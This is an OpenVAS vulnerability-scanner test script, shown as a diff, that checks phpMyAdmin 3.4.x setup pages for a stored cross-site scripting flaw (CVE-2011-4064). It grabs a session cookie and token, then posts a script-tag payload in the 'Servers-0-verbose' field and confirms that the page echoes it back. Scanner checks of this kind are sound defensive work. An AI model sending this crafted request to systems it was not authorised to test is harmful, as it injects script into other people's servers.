@@ -1,0 +1,164 @@
+###############################################################################
+# OpenVAS Vulnerability Test
+# $Id: secpod_phpmyadmin_setup_interface_xss_vuln.nasl 3570 2016-06-21 07:49:45Z benallard $
+#
+# phpMyAdmin Setup Interface Cross Site Scripting Vulnerability
+#
+# Authors:
+# Sooraj KS <kssooraj@secpod.com>
+#
+# Copyright:
+# Copyright (c) 2011 SecPod, http://www.secpod.com
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License version 2
+# (or any later version), as published by the Free Software Foundation.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+###############################################################################
+
+tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
+  and script code, which will be executed in a user's browser session in the
+  context of an affected site.
+  Impact Level: Application";
+tag_affected = "phpMyAdmin versions 3.4.x before 3.4.6";
+tag_insight = "The flaw is due to improper validation of user-supplied input
+  via the 'Servers-0-verbose' parameter to setup/index.php, which allows
+  attackers to execute arbitrary HTML and script code in a user's browser
+  session in the context of an affected site.";
+tag_solution = "Upgrade to phpMyAdmin version 3.4.6 or later,
+  For updates refer to http://www.phpmyadmin.net/home_page/downloads.php";
+tag_summary = "The host is running phpMyAdmin and is prone to cross-site scripting
+  vulnerability.";
+
+SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.902585";
+CPE = "cpe:/a:phpmyadmin:phpmyadmin";
+
+if(description)
+{
+  script_oid(SCRIPT_OID);
+  script_version("$Revision: 3570 $");
+  script_cve_id("CVE-2011-4064");
+  script_bugtraq_id(50175);
+  script_tag(name:"cvss_base", value:"4.3");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
+  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:49:45 +0200 (Tue, 21 Jun 2016) $");
+  script_tag(name:"creation_date", value:"2011-11-22 17:17:17 +0530 (Tue, 22 Nov 2011)");
+  script_name("phpMyAdmin Setup Interface Cross Site Scripting Vulnerability");
+
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_summary("Check if phpMyAdmin is vulnerable to Cross-Site Scripting");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2011 SecPod");
+  script_family("Web application abuses");
+  script_dependencies("secpod_phpmyadmin_detect_900129.nasl");
+  script_require_ports("Services/www", 80);
+  script_require_keys("phpMyAdmin/installed");
+  script_tag(name : "impact" , value : tag_impact);
+  script_tag(name : "affected" , value : tag_affected);
+  script_tag(name : "insight" , value : tag_insight);
+  script_tag(name : "solution" , value : tag_solution);
+  script_tag(name : "summary" , value : tag_summary);
+  script_xref(name : "URL" , value : "http://secunia.com/advisories/46431");
+  script_xref(name : "URL" , value : "http://securitytracker.com/id/1026199");
+  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/70681");
+  script_xref(name : "URL" , value : "http://www.phpmyadmin.net/home_page/security/PMASA-2011-16.php");
+  script_xref(name : "URL" , value : "http://hauntit.blogspot.com/2011/09/stored-xss-in-phpmyadmin-345-all.html");
+  exit(0);
+}
+
+
+include("http_func.inc");
+include("version_func.inc");
+include("http_keepalive.inc");
+include("host_details.inc");
+
+## Get HTTP Port
+if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
+
+## Check Port State
+if(!get_port_state(port)) {
+  exit(0);
+}
+
+if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
+
+## Send and Receive the response
+url = "/setup/index.php?tab_hash=&check_page_refresh=1&page=servers&mode=" +
+      "add&submit=New+server";
+req = http_get(item:dir+url,  port:port);
+res = http_keepalive_send_recv(port:port, data:req);
+
+## Get Session ID
+cookie = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
+if(isnull(cookie[1])) {
+  exit(0);
+}
+cookie = cookie[1];
+
+## Get Token
+token = eregmatch(pattern:'name="token" value="([a-zA-Z0-9]+)"', string:res);
+if(isnull(token[1])) {
+  exit(0);
+}
+token = token[1];
+
+## Construct attack request
+data = string("tab_hash=&check_page_refresh=1&token=", token, "&Servers-0-",
+              "verbose=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
+              "&Servers-0-host=localhost&Servers-0-port=&Servers-0-socket=&S",
+              "ervers-0-connect_type=tcp&Servers-0-extension=mysqli&submit_s",
+              "ave=Save&Servers-0-auth_type=cookie&Servers-0-user=root&Serve",
+              "rs-0-password=&Servers-0-auth_swekey_config=&Servers-0-auth_h",
+              "ttp_realm=&Servers-0-SignonSession=&Servers-0-SignonURL=&Serv",
+              "ers-0-LogoutURL=&Servers-0-only_db=&Servers-0-only_db-userpre",
+              "fs-allow=on&Servers-0-hide_db=&Servers-0-hide_db-userprefs-al",
+              "low=on&Servers-0-AllowRoot=on&Servers-0-DisableIS=on&Servers-",
+              "0-AllowDeny-order=&Servers-0-AllowDeny-rules=&Servers-0-ShowD",
+              "atabasesCommand=SHOW+DATABASES&Servers-0-pmadb=&Servers-0-con",
+              "troluser=&Servers-0-controlpass=&Servers-0-verbose_check=on&S",
+              "ervers-0-bookmarktable=&Servers-0-relation=&Servers-0-usercon",
+              "fig=&Servers-0-table_info=&Servers-0-column_info=&Servers-0-h",
+              "istory=&Servers-0-tracking=&Servers-0-table_coords=&Servers-0",
+              "-pdf_pages=&Servers-0-designer_coords=&Servers-0-tracking_def",
+              "ault_statements=CREATE+TABLE%2CALTER+TABLE%2CDROP+TABLE%2CREN",
+              "AME+TABLE%2CCREATE+INDEX%2CDROP+INDEX%2CINSERT%2CUPDATE%2CDEL",
+              "ETE%2CTRUNCATE%2CREPLACE%2CCREATE+VIEW%2CALTER+VIEW%2CDROP+VI",
+              "EW%2CCREATE+DATABASE%2CALTER+DATABASE%2CDROP+DATABASE&Servers",
+              "-0-tracking_add_drop_view=on&Servers-0-tracking_add_drop_tabl",
+              "e=on&Servers-0-tracking_add_drop_database=on");
+
+url = string(dir, '/setup/index.php?tab_hash=&check_page_refresh=1',
+             '&token=', token, '&page=servers&mode=add&submit=New+server');
+
+req = string("POST ", url, " HTTP/1.1\r\n",
+             "Host: ", get_host_name(), "\r\n",
+             "User-Agent: OpenVAS\r\n",
+             "Cookie: ", cookie, "\r\n",
+             "Content-Type: application/x-www-form-urlencoded\r\n",
+             "Content-Length: ", strlen(data), "\r\n\r\n", data);
+
+## Send crafted POST request and receive the response
+res = http_keepalive_send_recv(port:port, data:req);
+
+## Confirm exploit
+if(res =~ "HTTP/1.. 30")
+{
+  ## Send request and receive the response
+  req = http_get(item:string(dir,"/setup/index.php"), port:port);
+  req = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');
+  res = http_keepalive_send_recv(port:port, data:req);
+
+  ## Confirm exploit worked by checking the response
+  if(res =~ "HTTP/1\.. 200" && "Use SSL (<script>alert(document.cookie)</script>)" >< res){
+    security_message(port);
+  }
+}
